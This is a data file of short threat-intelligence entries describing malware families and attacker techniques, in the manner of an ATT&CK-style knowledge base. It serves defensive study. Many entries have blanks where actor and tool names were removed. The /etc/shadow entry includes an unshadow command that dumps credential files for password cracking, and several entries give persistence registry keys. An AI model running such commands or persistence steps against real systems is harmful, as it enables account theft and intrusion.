SamSam,"is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.",malware
SeaDuke,is malware that was used by  from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with . ,malware
Seasalt,is malware that has been linked to 's 2010 operations. It shares some code similarities with .,malware
ServHelper,is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.,malware
Shamoon,"is wiper malware that was first used by an Iranian group known as the ""Cutting Sword of Justice"" in 2012. Other versions known as Shamoon 2 and Shamoon 3 were observed in 2016 and 2018.  has also been seen leveraging  and Filerase to carry out data wiping tasks. The term Shamoon is sometimes used to refer to the group using the malware as well as the malware itself.",malware
ShimRat,"has been used by the suspected China-based adversary  in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name """" comes from the malware's extensive use of Windows Application Shimming to maintain persistence. ",malware
Skeleton Key,is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password.  Functionality similar to  is included as a module in .,malware
Skidmap,is a kernel-mode rootkit used for cryptocurrency mining.,malware
Smoke Loader,"is a malicious bot application that can be used to load other malware.
 has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins.  ",malware
Socksbot,is a backdoor that  abuses Socket Secure (SOCKS) proxies. ,malware
SoreFang,is first stage downloader used by  for exfiltration and to load other malware.,malware
SpeakUp,is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. ,malware
SslMM,is a full-featured backdoor used by  that has multiple variants. ,malware
Starloader,is a loader component that has been observed loading  and associated tools. ,malware
StoneDrill,is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with .,malware
StreamEx,"is a malware family that has been used by  since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. ",malware
StrongPity,is an information stealing malware used by .,malware
Sykipot,is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of  hijacks smart cards on victims.  The group using this malware has also been referred to as Sykipot. ,malware
SynAck,is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017.  ,malware
Sys10,is a backdoor that was used throughout 2013 by . ,malware
T9000,"is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations.  ",malware
TDTESS,is a 64-bit .NET binary backdoor used by . ,malware
TEXTMATE,is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with  in February 2017. ,malware
TINYTYPHON,is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. ,malware
TSCookie,is a remote access tool (RAT) that has been used by  in campaigns against Japanese targets..  has been referred to as  though more recent reporting indicates a separation between the two.,malware
TURNEDUP,is a non-public backdoor. It has been dropped by 's  malware.  ,malware
TYPEFRAME,is a remote access tool that has been used by . ,malware
Taidoor,"is malware that has been used since at least 2010, primarily to target Taiwanese government organizations. ",malware
TajMahal,"is a multifunctional spying framework that has been in use since at least 2014.  is comprised of two separate packages, named Tokyo and Yokohama, and can deploy up to 80 plugins.",malware
TinyZBot,is a bot written in C# that was developed by . ,malware
TrickBot,"is a Trojan spyware program that has mainly been used for targeting banking sites in United States, Canada, UK, Germany, Australia, Austria, Ireland, London, Switzerland, and Scotland. TrickBot first emerged in the wild in September 2016 and appears to be a successor to .  is developed in the C++ programming language.   ",malware
Trojan.Karagany,is a modular remote access tool used for recon and linked to  and . The source code for  originated from Dream Loader malware which was leaked in 2010 and sold on underground forums. ,malware
Trojan.Mebromi,is BIOS-level malware that takes control of the victim before MBR. ,malware
Truvasys,is first-stage malware that has been used by . It is a collection of modules written in the Delphi programming language.   ,malware
UBoatRAT,is a remote access tool that was identified in May 2017.,malware
UPPERCUT,is a backdoor that has been used by . ,malware
USBStealer,is malware that has used by  since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with .  ,malware
USBferry,"is an information stealing malware and has been used by  in targeted attacks against Taiwanese and Philippine air-gapped military environments.  shares an overlapping codebase with , though it has several features which makes it a distinct piece of malware.",malware
Umbreon,A Linux rootkit that provides backdoor access and hides from defenders.,malware
Unknown Logger,"is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. ",malware
Uroburos,is a rootkit used by . ,malware
Ursnif,"is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, s, and malicious links.  is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.",malware
VBShower,"is a backdoor that has been used by  since at least 2019.  has been used as a downloader for second stage payloads, including .",malware
VERMIN,"is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. ",malware
Valak,"is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.",malware
Vasport,is a trojan used by  to open a backdoor on compromised hosts.  ,malware
Volgmer,"is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. ",malware
WEBC2,"is a family of backdoor malware used by  as early as July 2006.  backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server. ",malware
WINDSHIELD,is a signature backdoor used by . ,malware
WINERACK,is a backdoor used by . ,malware
WannaCry,"is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.",malware
WellMail,"is a lightweight malware written in Golang used by , similar in design and structure to .",malware
WellMess,is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by .,malware
Wiarp,is a trojan used by  to open a backdoor on compromised hosts.  ,malware
WinMM,"is a full-featured, simple backdoor used by . ",malware
WindTail,is a macOS surveillance implant used by .  shares code similarities with Hack Back aka KitM OSX.,malware
Wingbird,is a backdoor that appears to be a version of commercial software . It is reportedly used to attack individual computers instead of networks. It was used by  in a May 2016 campaign.  ,malware
Winnti for Linux,"is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including . The Windows variant is tracked separately under .",malware
Winnti for Windows,"is a Trojan that has been used by multiple groups to carry out intrusions in varied regions from at least 2010 to 2016. One of the groups using this malware is referred to by the same name, ; however, reporting indicates a second distinct group, , also uses the malware.    The Linux variant is tracked separately under .",malware
Wiper,is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. ,malware
XAgentOSX,is a trojan that has been used by   on OS X and appears to be a port of their standard  or XAgent trojan. ,malware
XTunnel,a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by  during the compromise of the Democratic National Committee.   ,malware
Xbash,"is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks.  was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.",malware
YAHOYAH,is a Trojan used by  as a second-stage backdoor.,malware
ZLib,is a full-featured backdoor that was used as a second-stage implant by  from 2014 to 2015. It is malware and should not be confused with the compression library from which its name is derived. ,malware
Zebrocy,"is a Trojan that has been used by  since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, and VB.NET. ",malware
ZeroT,"is a Trojan used by , often in conjunction with .  ",malware
Zeroaccess,"is a kernel-mode  that attempts to add victims to the ZeroAccess botnet, often for monetary gain. ",malware
Zeus Panda,"is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. ’s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.",malware
ZxShell,"is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.",malware
adbupd,is a backdoor used by  that is similar to . ,malware
build_downer,is a downloader that has been used by  since at least 2019.,malware
down_new,is a downloader that has been used by  since at least 2019.,malware
gh0st RAT,is a remote access tool (RAT). The source code is public and it has been used by multiple groups. ,malware
hcdLoader,is a remote access tool (RAT) that has been used by . ,malware
httpclient,"is malware used by . It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. ",malware
iKitten,is a macOS exfiltration agent  .,malware
jRAT,"is a cross-platform, Java-based backdoor originally available for purchase in 2012. Variants of  have been distributed via a software-as-a-service platform, similar to an online subscription model. ",malware
njRAT,is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.,malware
pngdowner,"is malware used by . It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple ""download-and-
execute"" utility. ",malware
yty,"is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. ",malware
zwShell,is a remote access tool (RAT) written in Delphi that has been used by .,malware
Cobalt Strike,"is a commercial, full-featured, penetration testing tool which bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system. 

In addition to its own capabilities,  leverages the capabilities of other well-known tools such as Metasploit and . ",malware
Sunburst,is a trojanized DLL designed to fit within the SolarWinds Orion software update framework. It was used by  since at least February 2020.,malware
Sunspot,is an implant that injected the  backdoor into the SolarWinds Orion software update framework. It was used by  since at least February 2020. ,malware
Teardrop,is a memory-only dropper that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was likely used by  since at least May 2020.,malware
Raindrop,is a loader used by  that was discovered on some victim machines during investigations related to the 2020 SolarWinds cyber intrusion. It was discovered in January 2021 and was likely used since at least May 2020.,malware
.bash_profile and .bashrc,"Adversaries may establish persistence by executing malicious content triggered by a users shell. ~/.bash_profile and ~/.bashrc are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly.~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the ~/.bash_profile script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the ~/.bashrc script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment.The macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling ~/.bash_profile each time instead of ~/.bashrc.Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.",technique
/etc/passwd and /etc/shadow,"Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow. By default, /etc/shadow is only readable by the root user.The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db",technique
ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as  or .The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.Adversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.",technique
AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by  Kerberos messages. Preauthentication offers protection against offline . When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the users password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the users password.For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline  attacks similarly to  and expose plaintext credentials.  An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like  with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. Cracked hashes may enable , , and  via access to .",technique
Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,technique
Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. ) or used to spawn a new process (i.e. ). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",technique
Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  will cause the replaced file to be executed with SYSTEM privileges. Other accessibility features exist that may also be leveraged in a similar fashion: * On-Screen Keyboard: C:\Windows\System32\osk.exe* Magnifier: C:\Windows\System32\Magnify.exe* Narrator: C:\Windows\System32\Narrator.exe* Display Switcher: C:\Windows\System32\DisplaySwitch.exe* App Switcher: C:\Windows\System32\AtBroker.exe",technique
Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.Adversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.",technique
Account Discovery,Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.,technique
Account Manipulation,"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",technique
Acquire Infrastructure,"Before compromising a victim, adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",technique
Active Scanning,"Before compromising a victim, adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Add Office 365 Global Administrator Role,"An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role. This account modification may immediately follow  or other malicious account activity.",technique
Add-ins,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ",technique
AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. Similar to , this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",technique
AppInit DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. ",technique
AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line via osascript /path/to/script or osascript -e ""script here"". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.AppleScripts do not need to call osascript to execute, however. They may be executed from within mach-O binaries by using the macOS sNSAppleScriptorOSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute s, which otherwise would require compilation and execution in a mach-O binary file format.. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via .",technique
Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victims primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",technique
Application Exhaustion Flood,Adversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. ,technique
Application Layer Protocol,"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",technique
Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:* %WINDIR%\AppPatch\sysmain.sdb and* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdbCustom databases are stored in:* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and* hklm\software\microsoft\windows nt\currentversion\appcompatflags\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to  (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.",technique
Application Window Discovery,Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.,technique
Application or System Exploitation,"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.",technique
Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",technique
Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",technique
Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including  rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",technique
Archive via Utility,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip, WinRAR, and WinZip. Most utilities include functionality to encrypt and/or compress data.Some 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.",technique
Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receivers public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as .",technique
Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
At (Linux),Adversaries may abuse the  utility to perform task scheduling for initial or recurring execution of malicious code. The  command within Linux operating systems enables administrators to schedule tasks.An adversary may use  in Linux environments to execute programs at system startup or on a scheduled basis for persistence.  can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.,technique
At (Windows),"Adversaries may abuse the at.exe utility to perform task scheduling for initial or recurring execution of malicious code. The  utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using  requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. An adversary may use at.exe in Windows environments to execute programs at system startup or on a scheduled basis for persistence.  can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).Note: The at.exe command line utility has been deprecated in current versions of Windows in favor of schtasks.",technique
Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",technique
Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ with the key value of ""Authentication Packages""=&lt;target binary&gt;. The binary will then be executed by the system when the authentication packages are loaded.",technique
Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a  to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as  and  to identify and move files.",technique
Automated Exfiltration,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as  and .",technique
BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through  (COM).   BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through    and the  tool. Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.    BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).  BITS upload functionalities can also be used to perform . ",technique
Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the users .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the users last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. ",technique
